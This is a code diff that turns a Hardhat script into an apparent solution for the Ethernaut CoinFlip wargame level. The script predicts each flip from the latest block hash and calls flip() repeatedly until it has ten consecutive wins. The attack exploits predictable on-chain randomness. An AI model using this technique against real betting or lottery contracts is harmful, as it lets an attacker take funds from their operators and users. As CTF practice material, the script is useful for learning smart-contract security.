@@ -1,15 +1,51 @@
-import { ethers,  } from "hardhat";
+import { ethers } from "hardhat";
+import nsEthers from "ethers";
 
 const ETHERNAUT_ADDRESS = "";
 
 async function main() {
-  const Fallout = await ethers.getContractFactory("Fallout");
-  const fallout = await Fallout.attach(ETHERNAUT_ADDRESS);
-  console.log("Deploy Fallout contract at", fallout.address);
+  const CoinFlip = await ethers.getContractFactory("CoinFlip");
+  const coinflip = await CoinFlip.attach(ETHERNAUT_ADDRESS);
+  console.log("Attach CoinFlip contract to", coinflip.address);
 
-  const fal1outTx = await fallout.Fal1out();
-  await fal1outTx.wait();
-  console.log("Transaction Fal1out finished", fal1outTx.hash);
+  let lastBlock = await ethers.provider.getBlockNumber();
+  while(true) {
+    const newBlock = await getBlock();
+    if (lastBlock < newBlock.number) {
+      console.log("New block found!", newBlock.number);
+
+      const flipResponse = getFlipResponse(newBlock);
+      try {
+        const flipTx = await coinflip.flip(flipResponse, { gasLimit: 4000000 });
+        await flipTx.wait();
+        console.log("Flip transaction finished", flipTx.hash);
+      } catch (err) {
+        console.error(err);
+      }
+
+      const consecutiveWins = await coinflip.consecutiveWins();
+      console.log("Consecutive wins:", consecutiveWins.toString());
+
+      if (consecutiveWins.toNumber() >= 10) {
+        console.log("Congratulations! You won!");
+        break;
+      }
+
+      lastBlock = await ethers.provider.getBlockNumber();
+    }
+  }
+}
+
+function getFlipResponse(block: nsEthers.providers.Block): boolean {
+  const FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+  const hash = parseInt(block.hash);
+  const coinFlip = Math.floor(hash / FACTOR);
+  return coinFlip == 1;
+}
+
+async function getBlock(sub: number = 0): Promise<nsEthers.providers.Block> {
+  const lastBlockNumber = await ethers.provider.getBlockNumber();
+  return ethers.provider.getBlock(lastBlockNumber - sub);
 }
 
 main().catch((error) => {
